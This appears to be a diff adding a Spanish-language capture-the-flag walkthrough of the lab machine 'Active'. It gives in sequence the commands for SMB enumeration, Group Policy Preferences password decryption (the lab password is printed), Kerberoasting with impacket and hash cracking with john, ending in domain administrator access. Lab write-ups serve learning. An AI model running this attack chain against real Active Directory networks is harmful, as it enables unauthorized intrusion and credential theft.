@@ -1,0 +1,25 @@
+1.ping <ip>
+2.nmap -p- -sV -sC -vvv 10.129.24.157 -oN ports.txt -->Escaneo de puertos.
+3.netexec smb 10.129.24.157
+4.netexec smb 10.129.24.157 -u '' -p '' --shares
+5.smbclient -N //10.129.24.157/Replication 
+        -Nos movemos hasta Groups.xml el cual se encuentra en la carpeta \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\
+        -get Groups.xml
+6.batcat Groups.xml
+        -username: SVC_TGS
+        -password: edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ
+7.gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ -->descifrar la password
+        -password descifrada: GPPstillStandingStrong2k18
+8.netexec smb 10.129.24.157 -u 'SVC_TGS' -p 'GPPstillStandingStrong2k18' --shares
+9.smbclient //10.129.24.157/Users -U active.htb/SVC_TGS
+        -Nos movemos hasta la flag de user.txt que se encuentra en \SVC_TGS\Desktop\ 
+        -flag: .........
+9.impacket-GetUserSPNs active.htb/SVC_TGS -dc-ip 10.129.24.157 -request --> Realizamos el vector kerberoasting y pedimos el ticket de Administrator.
+        -Nos aparecerá un hash estilo $krb5....
+10.sudo nano hash_admin.txt -->Metemos el hash completo
+11.john hash_admin.txt -wordlist=/usr/share/wordlists/rockyou.txt
+        -password Administrator: ........... 
+12smbclient //10.129.24.157/Users -U active.htb/Administrator
+        -Nos movemos hasta root.txt el cual se encuentra en la carpeta Administrator\Desktop\   
+        -get root.txt
+        -flag: ............
